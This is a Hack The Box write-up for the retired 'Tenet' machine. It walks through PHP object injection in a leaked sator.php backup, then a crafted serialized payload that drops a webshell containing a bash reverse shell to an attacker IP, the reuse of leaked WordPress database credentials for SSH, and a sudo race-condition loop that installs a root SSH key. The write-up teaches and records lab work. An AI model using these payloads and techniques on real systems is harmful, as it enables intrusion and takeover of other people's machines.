# Tenet

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Medium |
| **IP Address** | 10.10.10.223 |
| **Status** | Retired |

## Overview
Tenet is an Apache/WordPress box named after (and themed around) the movie "Tenet": the exploitation path itself runs "backwards/forwards" between a hidden PHP file and its own backup. A WordPress comment hints at a forgotten `sator.php` migration script and its `.bak` backup; reading the backup reveals PHP object-deserialization on unsanitized user input, which is used to plant a webshell. WordPress database credentials recovered from `wp-config.php` provide SSH access, and a misconfigured `sudo` rule around an SSH-enabling helper script is abused with a race condition to obtain a root shell.

## Reconnaissance
Initial `nmap -sC -sV` (`nmap/initial`) showed:
```
22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http  Apache httpd 2.4.29 ((Ubuntu))
```
A full-port scan (`nmap/allports`) against `sator.tenet.htb` confirmed only ports 22 and 80 were open.

## Enumeration
The web root at `tenet.htb` hosted a WordPress site. Browsing `wp-content/uploads/` and the blog comments surfaced a comment from a user "neil" hinting at leftover files:

> "did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!"

This pointed to a `sator.php` script and a `sator.php.bak` backup at the site root (preserved locally as `files/sator.php.bak`). The backup revealed the following vulnerable code:

```php
class DatabaseExport {
    public $user_file = 'users.txt';
    public $data = '';

    public function __destruct() {
        file_put_contents(__DIR__ . '/' . $this->user_file, $this->data);
    }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);
```

`sator.php` unserializes the raw `arepo` GET parameter into a `DatabaseExport` object. Because the object's `__destruct()` magic method writes `$this->data` to a file named `$this->user_file`, an attacker fully controls both the file name and its contents through the serialized object: a classic PHP Object Injection / arbitrary file write primitive.

## Foothold
A malicious serialized object was crafted to drop a PHP webshell into the site's document root:

```php
class DatabaseExport {
    public $user_file = 'lulz.php';
    public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.10.14.53/1234 0>&1\'"); ?>';
}
print urlencode(serialize(new DatabaseExport));
```

The resulting URL-encoded payload was sent to `sator.php?arepo=<payload>`, which wrote `lulz.php` to the web root. Requesting `sator.tenet.htb/lulz.php` while a `nc` listener was active on port 1234 triggered the payload and returned a reverse shell as the web-server user.

With code execution, `wp-config.php` was read directly and disclosed WordPress database credentials:
```
DB_USER: neil
DB_PASSWORD: Opera2112
```
The WordPress `users` table also contained password hashes for `neil` and `protagonist`, but rather than cracking them the recovered plaintext WordPress DB password was reused directly for SSH:
```
ssh neil@tenet.htb   # neil : Opera2112
```

## Privilege Escalation
`sudo -l` as `neil` showed:
```
(ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
```
The script writes an attacker-supplied SSH public key into a file matching `/tmp/ssh*`, but does so non-atomically. By racing a loop that continuously (re)writes an SSH public key to a temporary file while repeatedly invoking `sudo /usr/local/bin/enableSSH.sh`, the script can be tricked into installing the attacker's public key as an authorized key for `root`:
```bash
while true; do echo "<ssh-pubkey>" | tee /tmp/ssh* > /dev/null; done
```
Running this in parallel with several invocations of `sudo /usr/local/bin/enableSSH.sh` eventually results in the public key being accepted for the root account, after which `ssh -i <private-key> root@tenet.htb` gives a root shell.

## Lessons Learned
- Blog/CMS comments are a real recon source: they can leak the existence of forgotten files and backups.
- Always request the `.bak`/`~` version of any discovered script; developers frequently leave readable copies of source code that reveal vulnerabilities like insecure `unserialize()` calls.
- PHP magic methods (`__destruct`, `__wakeup`, etc.) reachable via `unserialize()` on user input are a well-known and dangerous PHP Object Injection primitive.
- Non-atomic file writes in `sudo`-permitted helper scripts can be exploited with simple race conditions ("TOCTOU").

## Tools & References
- `files/sator.php.bak`: kept locally; the leaked backup source that revealed the PHP Object Injection vulnerability.
- No binaries, keys, or large loot files were present for this machine; nothing else was omitted.
